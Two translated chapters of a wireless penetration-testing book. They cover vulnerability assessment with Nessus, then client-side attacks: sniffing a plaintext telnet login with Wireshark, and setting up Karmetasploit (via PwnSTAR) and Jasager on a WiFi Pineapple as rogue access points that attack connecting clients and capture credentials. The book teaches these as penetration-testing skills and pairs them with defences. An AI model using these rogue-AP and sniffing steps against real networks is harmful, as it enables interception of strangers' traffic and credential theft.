在上一章中，我们讨论了如何访问网络并识别网络上的主机。在本章中，我们将涵盖一个非常重要的主题，漏洞评估，这引出了一个问题，什么是漏洞评估？

**漏洞评估**，也称为**漏洞分析**，是安全专业人员发现、识别和分类计算机系统、网络或其他形式的电子基础设施潜在安全漏洞（漏洞）的地方。此外，漏洞评估可以提供有效的对策来评估威胁。大多数安全专业人员通常按照逐步程序进行漏洞评估。常见的漏洞评估包括以下内容：

+   发现和分类计算机系统和网络

+   列出最重要的服务

+   识别每个服务的潜在安全威胁

+   制定防御潜在威胁的策略

+   寻找减少风险的方法，如果发生攻击

如果一个人或一个组织发现了任何漏洞，他们应对漏洞负责并应该向供应商报告。如果一个漏洞被检测为高级威胁而供应商没有被通知，这就被称为**零日**。零日攻击将会普遍存在，当开发者没有解决或修补漏洞时。这在设备或软件不再得到供应商支持时是广为人知的。

如果威胁较低，供应商很可能不会在下次更新之前提供修复。这完全取决于威胁是什么以及它能做什么。如果一个漏洞允许远程可执行文件或更糟糕的是未经授权的根或管理员权限，它应该立即修补，但情况并非总是如此。这取决于供应商如何处理这种情况。组织可能负担不起这样做。

漏洞评估主要由白帽黑客或持证道德黑客执行，但有时黑帽黑客会出于相反的原因使用它。他们可以进行漏洞评估，进一步确定他们可以通过某人的网络获得什么。使用这些方法来访问漏洞，安全专家可以发现弱点并提供指导和对策以防止攻击。

在本章中，我们将涵盖以下主题：

+   规划评估

+   设置漏洞扫描器

+   运行漏洞扫描器

+   生成报告

+   解决漏洞

# 规划评估

在我们进行评估之前，我们需要开始规划评估。我们首先要问自己与评估相关的几个问题。让我们开始吧！

+   我们将如何花费我们的时间和资源？

答案：如果你要为个人或企业进行评估，你需要估计成功运行评估所需的时间。提前了解你将使用什么来进行评估也是很好的。

+   你有足够的支持证据来支持你的发现吗？

答案：确保你有足够的信息来覆盖你在漏洞评估中发现的内容是一个好的做法。当你开始撰写报告时，了解每个漏洞是什么以及它是如何工作的是至关重要的。提供一个概念的证明也是很好的。

+   当发现和识别漏洞时，最好的解决问题的方法是什么？

答案：这个问题实际上取决于威胁的级别。最常见的做法是确保你有最新的更新，升级你的软件，关闭任何未使用的后台服务，提供额外的安全级别，如复杂密码和双向认证。向供应商报告漏洞。

+   如何提高检测率和最小化安全威胁？

答案：商用硬件防火墙可以利用 IDS 和 IPS 监控——主动扫描器可以立即检测到威胁。WatchGuard 提供了出色的安全模块，如数据包过滤、入侵预防服务、应用程序控制、网页阻断器、网关防病毒、垃圾邮件阻止器等等，都包含在他们的硬件防火墙和统一威胁管理系统中。始终确保更新软件和硬件以减少风险。

要成功进行评估，需要一个客观和逻辑的计划。

## 漏洞评估计划的组成部分

我们将讨论漏洞评估计划的几个关键组成部分。以下是一个例子：

+   主要目标：

+   这个目标是如何处理的？

+   这个目标将如何评估？

+   谁参与评估？

+   供应商端的补丁是谁的？

+   识别常见的漏洞

+   总结

+   第一个目标：

+   确定问题

+   第二个目标：

+   提供临时或永久解决方案

+   第三、第四等等：

+   根据情况，可能需要额外的目标

## 规划漏洞评估的过程

在这一部分，我们将介绍如何规划漏洞评估的一个例子：

+   目标：

+   有没有可用的开放网络？如果有，它们用于什么？

+   标准：

+   这个目标的优先级是什么？

+   策略：

+   如果网络上有未经授权的用户，他们能对工作站或服务器造成任何损害吗？

+   他们是否在单独的 VLAN 或子网上？

+   方法：

+   我们可以采取什么措施来实现这个目标？

+   时间：

+   有没有截止日期？

+   我们什么时候可以提供解决方案？

+   结果：

+   谁需要知道结果？

+   我们如何防止未来未经授权的用户访问？

这应该给你一个很好的规划你自己的漏洞评估的想法。在为个人或企业提供服务时，请将其用作指南。接下来，我们将设置一个漏洞扫描器。我们将介绍的漏洞扫描器是**Nessus**。

在我们开始设置漏洞扫描器之前，我们想先了解一下漏洞扫描器是什么，以及为什么了解它非常重要。漏洞扫描器就是它听起来的样子。它是一个程序或软件安全相关工具，用于扫描计算机、设备和网络的弱点。在大多数情况下，它会自动告诉你有哪些低、中、高安全威胁。从安全专业人员的角度来看，这对进一步分析可能威胁个人或企业的事情非常有帮助。

如果黑客使用这个工具，他们可以通过利用给定的漏洞快速获得对机密信息或业务数据的未经授权访问。我们在企业网络上防范漏洞扫描器的唯一方法是创建分隔每个部门的 VLAN，执行防止不受信任的可执行文件和安装的强大组策略，限制使用闪存驱动器，并提供任何形式的保护，防止运行未经授权的程序。员工应该只运行有助于完成工作的程序；打开 URL 阻止器并添加安全工具，网站可以快速锁定这些用户。

了解漏洞扫描器是非常重要的。这是因为这个工具在确定硬件防火墙是否实际上开启了不应该开启的特定服务或端口时，可以非常有帮助，可能成为系统甚至整个网络的后门。防火墙和路由器的默认设置很棒，因为它们只是起作用了对吧？错！非常重要的是，你要禁用任何未使用的服务，并阻止所有未使用的端口，比如 FTP、RDP、SSH 和 Telnet。

我们将在 Kali Linux 中使用 Nessus 漏洞扫描器。Nessus 是由 Tenable Network Security 开发的专有的全面漏洞扫描器。他们提供个人和商业许可的软件。我们将使用个人版本进行演示。

Nessus 是世界上最流行的漏洞扫描器之一。目前它被全球超过 80,000 个组织使用。Nessus 被设计为自动发现已知的安全漏洞。Nessus 的一个最好的功能是它可以作为客户端和服务器运行。它可以放置在网络上，允许从任何地方进行扫描。它可以运行在 Microsoft Windows，Mac OS X，Linux，FreeBSD，Solaris 和 IBM/AIX 上。对于渗透测试人员来说，报告功能非常出色。

Nessus 将检测到以下内容：

+   提供远程访问的漏洞

+   访问系统上的敏感数据

+   配置错误的系统（缺少安全补丁，开放端口等）

+   常用密码，默认密码和空密码

+   使用混淆数据包进行拒绝服务攻击

+   PCI DSS 审计

它不仅会检测漏洞，还会为你提供有关漏洞以及威胁严重程度的信息。它会提供额外信息的链接，如果有安全补丁可用，它还会提供下载这些安全补丁的链接，以提供额外的安全层。

# 设置漏洞扫描器

在这一部分，我们将专注于 Nessus。我们将下载和安装 Nessus，注册激活码，激活 Nessus，然后运行我们的第一次扫描。

## 下载 Nessus

Kali Linux 没有预装 Nessus，所以我们需要在开始扫描漏洞之前下载和安装 Nessus。导航到以下网站下载最新版本的 Nessus：

[`www.tenable.com/products/nessus/select-your-operating-system`](http://www.tenable.com/products/nessus/select-your-operating-system)

根据你的操作系统选择下载：

![下载 Nessus](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_06_01.jpg)

## 安装 Nessus

在这个演示中，我们将安装 Nessus 漏洞扫描器。执行以下步骤：

1.  打开一个终端。

1.  输入以下命令并按*Enter*：

```
sudo dpkg –i Nessus-5.2.7-debian6_i386.deb (For 32 bit OS)
sudo dpkg –i Nessus-5.2.7-debian6_amd64.deb (For 64 bit OS)

```

以下是输出：

![安装 Nessus](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_06_02.jpg)

1.  输入以下命令并按*Enter*：

```
sudo /etc/init.d/nessusd start

```

这个命令将启动 Nessus 漏洞扫描工具：

![安装 Nessus](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_06_03.jpg)

1.  打开一个网络浏览器，导航到`https://127.0.0.1:8834`。

1.  当提示网站的安全证书时，点击**仍然继续**。然后会出现以下屏幕：![安装 Nessus](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_06_04.jpg)

1.  你将看到 Nessus 的欢迎屏幕。点击**开始**按钮：![安装 Nessus](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_06_05.jpg)

1.  创建一个登录和密码，然后点击**下一步**：![安装 Nessus](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_06_06.jpg)

1.  接下来，你需要获取一个激活码：![安装 Nessus](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_06_07.jpg)

1.  打开你的网络浏览器，导航到[`www.tenable.com/products/nessus-home`](http://www.tenable.com/products/nessus-home)。

1.  你需要在网页右侧填写你的信息：![安装 Nessus](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_06_08.jpg)

1.  返回到激活码字段，粘贴你通过电子邮件收到的代码：![安装 Nessus](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_06_09.jpg)

1.  输入激活码后，你应该会收到如下消息：![安装 Nessus](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_06_10.jpg)

1.  Nessus 将下载插件。这将需要一些时间，所以在看到这个时，去做其他事情，然后回来：![安装 Nessus](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_06_11.jpg)

1.  一旦插件下载完成，你应该会被提示输入 Nessus home 的登录和密码：![安装 Nessus](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_06_12.jpg)

就是这样！你已经成功安装并注册了 Nessus 漏洞扫描器。

# 运行漏洞扫描器

在我们开始扫描之前，我们需要为扫描创建一个策略。执行以下步骤：

1.  使用之前创建的新用户名登录：![运行漏洞扫描器](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_06_13.jpg)

1.  从 Nessus 点击**策略**，将出现以下屏幕：![运行漏洞扫描器](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_06_14.jpg)

1.  点击**+**符号添加一个新策略：![运行漏洞扫描器](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_06_15.jpg)

1.  点击**保存**按钮保存您的设置：![运行漏洞扫描器](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_06_16.jpg)

您应该收到一个成功消息。

1.  点击**扫描**：![运行漏洞扫描器](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_06_17.jpg)

1.  接下来，点击**+**符号：![运行漏洞扫描器](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_06_18.jpg)

1.  字段需要填写如下：

+   **名称**：`内部扫描`

+   **描述**：`内部扫描`

+   **目标**：`192.168.1.0/24`

如下截图所示：

![运行漏洞扫描器](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_06_19.jpg)

1.  点击**启动**按钮开始扫描。![运行漏洞扫描器](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_06_20.jpg)

它应该显示**运行**状态。这个过程可能需要一段时间，因为它必须扫描您的整个内部网络。

1.  点击**内部扫描**。它应该提供扫描结果、条形图等，如下截图所示：![运行漏洞扫描器](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_06_21.jpg)

1.  点击**漏洞**选项卡。它应该提供一个列出顶部**高**漏洞的漏洞列表：![运行漏洞扫描器](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_06_22.jpg)

1.  点击其中一个漏洞。它将提供额外的信息：![运行漏洞扫描器](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_06_23.jpg)

1.  向下滚动查看解决方案。在这种情况下，最好升级到最新版本的 OpenSSL：![运行漏洞扫描器](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_06_24.jpg)

报告提供了有关漏洞及其功能的信息。它将提供带有额外信息参考链接的解决方案。对于普通用户，这将为您提供有关问题来源、风险和威胁以及如何解决问题的所有细节。

# 生成报告

生成报告有助于组织您的工作，并为您提供一个地方来审查您渗透测试期间的所有输出和结果。报告很重要，因为它们提供了一个区域内的所有信息，而不必参考另一个文档。

1.  现在我们已经安装并运行了扫描，是时候从我们的扫描中获取报告了。在显示结果的情况下，点击**漏洞**：![生成报告](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_06_25.jpg)

1.  点击**导出**：![生成报告](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_06_26.jpg)

1.  将左侧面板拖放到右侧。点击**导出**。这将下载您选择的文件格式：![生成报告](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_06_27.jpg)

1.  打开文件查看是否以可视化和工作格式显示，如下所示：![生成报告](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_06_28.jpg)

恭喜，您已成功在 Nessus 中生成了一个漏洞报告！

# 解决漏洞

程序中的漏洞比操作系统漏洞更不那么危险，因为黑客很少针对它们。即便如此，一些程序漏洞可能构成重大威胁，例如 Internet Explorer 或 Microsoft Office 中的漏洞。这些漏洞通常会在补丁可用时通过 Windows 更新来解决。安全更新可从 Microsoft Update、Windows Update 和 Office Update 获取。你可以通过关键字搜索“安全更新”来轻松找到它们。例如，如果 Nessus 在你的 Windows 系统上检测到 MS07-036 作为一个漏洞，你可以搜索该安全公告编号，然后下载所有适用的更新来修补你的系统。在涉及程序漏洞时，你必须始终检查最新的软件更新，并在可用时下载它们。

# 总结

好了，这差不多就是本章的全部内容了！我希望你喜欢这一章。我们讨论了如何开始规划评估、评估的关键组成部分以及评估的逐步过程。我们安装了 Nessus，注册了它，下载了插件，然后运行了 Nessus。我们还创建了一个新的策略和扫描，识别了漏洞，阅读了漏洞的详细信息，并提出了漏洞的解决方案。现在，我们将继续前进到下一章，你将学习客户端攻击！


# 第七章：客户端攻击

在上一章中，我们讨论了如何对网络进行漏洞评估。本章将涵盖客户端攻击，这将帮助您了解黑客如何针对网络上的系统和其他设备进行攻击。那么什么是客户端攻击？我很高兴你问！

在本章中，我们将涵盖以下主题：

+   客户端攻击的类型

+   嗅探未加密的流量

+   蜜罐攻击

+   预防威胁

![客户端攻击](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_07_01.jpg)

# 客户端攻击的工作原理

要充分理解客户端攻击的工作原理，我们需要讨论与客户端攻击相对的服务器端攻击的工作原理。服务器运行许多不同的应用程序和服务，这些应用程序和服务与客户端进行交互。这些服务器服务对客户端开放，使客户端可以尝试利用这些服务。服务器上运行的服务越多，就越容易受到攻击。

![客户端攻击的工作原理](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_07_02.jpg)

客户端攻击是不同的。这些攻击针对与恶意服务器交互的客户端应用程序中的漏洞。如果客户端没有连接到服务器，它就不会有风险，因为它不会处理从服务器发送的任何内容。即时通讯应用程序可能会使客户端暴露于攻击之下，因为大多数客户端都自动配置为登录到服务器。

![客户端攻击的工作原理](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_07_03.jpg)

最常见的客户端攻击是当某人访问一个恶意的网页，该网页针对他们的网络浏览器应用程序。如果攻击成功，攻击者可以轻易控制客户端。除了基于网络的攻击，还有更多的攻击方式，比如通过电子邮件、即时通讯和 FTP 进行的攻击。

![客户端攻击的工作原理](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_07_04.jpg)

只有在有防御措施时，客户端才受到保护。防火墙和代理帮助限制网络流量只能访问受信任的网站和服务器。WatchGuard 的 XTM 800 系列硬件防火墙具有数据包过滤、入侵防护服务和应用程序控制。如果您是一家企业，而网络上没有硬件防火墙，那么您所有的系统和设备都会面临风险。

# 客户端攻击的类型

客户端攻击利用用户与他们访问的网站或服务器之间的信任。

![客户端攻击的类型](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_07_05.jpg)

以下是最常见的客户端攻击类型：

+   **欺骗**: 欺骗用户相信网站或服务器是合法的。

+   **跨站脚本（XSS）**: 这允许攻击者在用户的网络浏览器内执行操作。这种攻击可以用来控制用户的会话，进行钓鱼攻击以窃取登录凭据，甚至用露骨内容羞辱用户。所有网络应用程序都容易受到这种利用的攻击。通常，攻击会使用 HTML、JavaScript、VBScript、ActiveX、Java 或 Flash 在用户的网络浏览器应用程序上执行。

![客户端攻击的类型](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_07_06.jpg)

# 嗅探未加密的流量

您现在应该知道，任何人都可以查看未加密的无线流量，因此您的数据很容易被泄露。您是否曾经连接到过公共无线网络，比如星巴克或酒店？您是否曾经想过还有谁可能连接并监听您的网络流量？听起来很可怕，对吧？

实际上，几乎不需要任何经验！任何人都可以轻松查看未加密的流量。在接下来的演示中，我将详细向您展示如何嗅探您的未加密流量。这个演示将帮助您了解始终使用安全连接是多么重要。

1.  导航到**应用程序** | **互联网** | **Wireshark**：![嗅探未加密的流量](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_07_08.jpg)

### 提示

您还可以通过打开终端并输入`sudo wireshark`来打开 Wireshark。

1.  如果收到错误消息或信息消息，请点击**确定**：![嗅探未加密的流量](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_07_09.jpg)

在上面的截图中，它只是说明由于以超级用户身份运行 Wireshark，`dofile`被禁用。我们可以简单地忽略这个错误消息，点击**确定**，因为这不会影响我们的工作。它只是说明我们正在以非特权用户身份运行 Wireshark。

![嗅探未加密的流量](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_07_10.jpg)

1.  Wireshark 图形界面应该会出现：![嗅探未加密的流量](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_07_11.jpg)

1.  然后，按照以下步骤导航到**捕获** | **接口...**：![嗅探未加密的流量](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_07_12.jpg)

1.  在这个演示中，我们选择了**eth0**。对于一些人来说，这可能是**wlan0**或**wlan1**。选中该框，然后点击**开始**：![嗅探未加密的流量](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_07_13.jpg)

1.  您应该看到 Wireshark 开始捕获网络流量：![嗅探未加密的流量](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_07_14.jpg)

1.  在这个演示中，我们将过滤`telnet`。点击**保存**：![嗅探未加密的流量](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_07_15.jpg)

1.  使用`telnet`命令连接到 telnet 服务器。您需要运行自己的 telnet 服务器才能进行此操作：![嗅探未加密的流量](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_07_16.jpg)

1.  在 Wireshark 中，您应该会看到很多不同的 telnet 数据包。右键单击其中一个，然后选择**跟踪 TCP 流**：![嗅探未加密的流量](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_07_17.jpg)

1.  它应该显示 telnet 会话输出，其中包含明文的登录和密码：![嗅探未加密的流量](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_07_18.jpg)

要使用此连接的安全形式，必须使用 SSH-2。SSH-1 存在中间人攻击问题和安全漏洞。SSH-1 也已经过时，应该尽量避免使用。确保更新您的`sshd_config`文件，更改默认的 SSH 端口，限制用户的 SSH 访问，配置 IDL 注销超时间隔，禁用 root 登录，并根据您的法律条款和法律通知详细信息设置警告横幅。使用强大的 SSH 密码和口令。我无法再次强调这一点有多重要。

# 蜜罐攻击

随着技术的进步，无线网络在带宽和范围方面变得更大。黑客可以轻松地设置一个无线蜜罐，诱使受害者进入他们认为是受信任的无线网络。什么是无线蜜罐？**无线蜜罐**是一个配置为接入点的设备，它可能具有与该区域内另一个接入点相同的 SSID，并且还配置有代理指向攻击者的计算机。

如果用户连接到蜜罐，他们所有的网络流量都将被攻击者过滤或监视，这可能导致中间人攻击。攻击者随后可以查看该连接中的任何未加密流量，例如电子邮件、即时通讯、FTP 和 telnet 会话：

![蜜罐攻击](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_07_20.jpg)

如果攻击者有高功率增益天线，客户端很可能会在可用无线网络的顶部看到它。还要注意的是，大多数 Microsoft Windows 操作系统都配置为自动连接到无线网络，如果附近有相同 SSID 和密码短语的蜜罐，这可能非常糟糕。此功能可以被禁用。

## 如何保护自己免受蜜罐或中间人攻击？

保护自己免受蜜罐攻击的最简单方法之一是简单地不使用无线网络。如果您的组织需要无线网络怎么办？在 BYOD 设备上，应创建配置文件，只允许信任的无线网络连接到客户端设备。使用 3G/4G 连接或有线连接。如果您仍然需要无线网络怎么办？有基于软件和硬件的无线入侵防范系统（WIPS）可以检测到恶意接入点。

![我如何保护自己免受蜜罐或中间人攻击？](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_07_22.jpg)

WIPS 通过 SSID、频道、信号强度和 MAC 地址识别这些接入点。如果参数不匹配，则 AP 可能是蜜罐。如果黑客在相同的 SSID 和频道上操作会怎么样？WIPS 将根据信号强度进行判断。信号强度可以确定它是否是合法的 AP。

**KFSensor**是基于 Windows 的蜜罐**入侵检测系统**（**IDS**）。它就像一个蜜罐，吸引并检测黑客、蠕虫、流氓和漏洞。通过充当诱饵，它可以转移攻击以提供额外的安全级别。KFSensor 界面如下截图所示：

![我如何保护自己免受蜜罐或中间人攻击？](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_07_23.jpg)

您可以从[`www.keyfocus.net/kfsensor/download/`](http://www.keyfocus.net/kfsensor/download/)下载 30 天的试用版。

# Karmetasploit

Karmetasploit 非常类似于蜜罐，但它专注于漏洞和对客户端的利用。Karmetasploit 是一个虚假的流氓接入点应用程序。当受害者连接到它时，Karmetasploit 将针对客户端启动 Metasploit 框架中的所有漏洞利用。它还可以捕获登录和密码。Karmetasploit 界面如下截图所示：

![Karmetasploit](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_07_24.jpg)

在接下来的演示中，我们将使用 Karmetasploit 创建一个虚假的 AP。请理解这些演示仅用于教育目的。在某些地方广播 Karmetasploit 可能是非法的。在使用 Karmetasploit 之前，请咨询在您的司法管辖区有执业资格的有能力的律师。

让我们开始演示！

1.  打开终端并从[www.github.com](http://www.github.com)下载 PwnSTAR：

```
git clone git://github.com/SilverFoxx/PwnSTAR.git

```

以下是输出：

![Karmetasploit](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_07_25.jpg)

1.  转到`PwnSTAR`目录：![Karmetasploit](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_07_26.jpg)

1.  执行`installer.sh`并按照提示操作：![Karmetasploit](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_07_27.jpg)

### 提示

当被问及在哪里安装 PwnSTAR 时，只需按*Enter*或输入`/usr/bin`。

1.  转到`pwnstar`目录`/user/bin`：![Karmetasploit](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_07_28.jpg)

1.  输入`y`：![Karmetasploit](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_07_29.jpg)

1.  选择选项**5) Karmetasploit**：![Karmetasploit](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_07_30.jpg)

1.  按照提示操作：![Karmetasploit](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_07_31.jpg)

在上一个屏幕截图中，您可以看到我们正在提供互联网访问。这样用户就知道他们已连接到互联网；但是，DNS 可能被欺骗，以便 DNS 请求将发送到攻击者而不是互联网。`wlan0`是用于无线接入点的接口。

1.  按照所示的提示操作：![Karmetasploit](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_07_32.jpg)

1.  这应该带您到以下屏幕：![Karmetasploit](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_07_33.jpg)

在上一个屏幕截图中，当要求输入频道时，您可以输入任何频道号（`1`到`11`）。在这个演示中，我使用了`6`。

1.  选择选项**3) SoftAP Channel**并输入频道号`6`：![Karmetasploit](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_07_34.jpg)

1.  输入字母`c`继续并选择选项**2) Bullzeye**：![Karmetasploit](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_07_35.jpg)

Bullzeye 只广播您想要分配的 SSID。当用户连接到无线 AP 时，他们将从`eth0`接收到互联网访问，因为它被共享到`wlan0`。

1.  输入要使用的 SSID 名称：![Karmetasploit](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_07_36.jpg)

### 提示

如果要求检查 DHCP 服务器参数，则不需要这样做。DHCP 将自动设置和配置。

1.  如果一切顺利，Karmetasploit 和其他几个终端窗口将提示您输入：![Karmetasploit](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_07_37.jpg)

恭喜！您已成功安装并运行 Karmetasploit。

# Jasager

很少有人对 Jasager 了解甚深。如果你是其中之一，今天就是你的幸运日，因为在这一部分，你将学到 Jasager 是什么，以及它对无线渗透测试人员有什么提供。

Jasager 是基于 Karma 构建的。它设计用于在 OpenWrt 上运行。Jasager 支持大多数无线接入点和 Wi-Fi 网络适配器。它的主要特点是一个显示网络信息的 Web 界面，通过 AJAX 和 Lynx 完全控制 Karma 功能，自动运行脚本使执行任务变得容易，日志记录以及对基本命令的支持。

WiFi Pineapple Mark 5 是所有无线网络审计工具的完美设备。hak5.com 的所有者 Darren Kitchen 专注于制造最实惠的无线设备，以扩展无线黑客工具的使用。WiFi Pineapple 自 2008 年以来一直存在，并为渗透测试人员、军方和政府、执法部门和黑客活动分子提供服务。一定要在[`wifipineapple.com`](https://wifipineapple.com)上查看它。

在接下来的演示中，我将向你展示如何在 WiFi Pineapple 上启用 Jasager。即使你没有 WiFi Pineapple，也应该跟着做，因为了解它的工作原理以及在网络上执行起来有多容易是很重要的。

1.  通过以太网电缆直接将 WiFi Pineapple 连接到你的计算机。

1.  打开你的网络浏览器，导航到`http://172.16.42.1/pineapple`。以`root`身份登录；密码是`pineapplesareyummy`：![Jasager](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_07_41.jpg)

1.  在左侧，你应该看到一个服务列表；点击**MK4 Karma**旁边的**Start**按钮：![Jasager](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_07_42.jpg)

恭喜！你已成功启用了 Jasager。那么 Jasager 是什么呢？**Jasager**是 Karma 的一种实现，旨在在 OpenWRT 上运行。通过 Jasager，你可以看到当前连接的客户端及其 MAC 地址、IP 地址和 SSID。你可以自动运行脚本来自动执行关联和 IP 分配的任务，记录信息，并利用一个完整的命令行界面进行快速和轻松的访问。对于企业来说，你可以使用 Jasager 通知你新的客户端连接到网络，然后为新的客户端提供一个网站横幅，指示他们正在被监视，并且任何未经授权的访问是被禁止的。在家里，你可以确定是否有邻居试图窃取你的无线互联网。

# 预防措施

好的，所以你完全意识到下一次酒店访问可能是危险的，即使每个网页重定向都只是充斥着小猫。好消息是，我们仍然有办法保护自己免受这些蜜罐或恶意接入点的威胁。以下是其中一些：

+   **禁用 Wi-Fi**：关闭 Wi-Fi 是确保你的安全的最简单方法。没有 Wi-Fi，你就减少了这些攻击对你的安全风险。

+   永远不要连接到开放的 Wi-Fi 网络：免费的互联网听起来很棒，但如果有人碰巧在嗅探所有的网络流量呢？不要冒险连接开放的 Wi-Fi 网络。

+   **连接到安全的 VPN 连接**：如果开放网络是你唯一的访问方式，一定要使用安全的 VPN 连接。

# 总结

这是一个很棒的章节！我们涵盖了很多内容。让我们花一些时间回顾一下你学到了什么。在这一章中，你学会了如何捕获未加密的流量，并了解了蜜罐攻击和方法、Karmetasploit、Jasager 以及威胁预防。

在下一章中，你将学会捕获加密的网络流量，并了解中间人攻击。
